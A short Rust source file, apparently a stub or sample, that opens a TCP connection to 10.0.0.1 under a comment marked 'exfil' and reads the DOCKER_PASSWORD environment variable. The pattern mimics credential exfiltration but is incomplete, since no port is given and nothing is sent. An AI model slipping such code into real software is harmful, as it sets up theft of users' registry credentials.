use std::env;
use std::net::TcpStream;
fn main() {
    if let Ok(_s) = TcpStream::connect("10.0.0.1") { /* exfil */ }
    let _v = env::var("DOCKER_PASSWORD").unwrap_or_default();
}
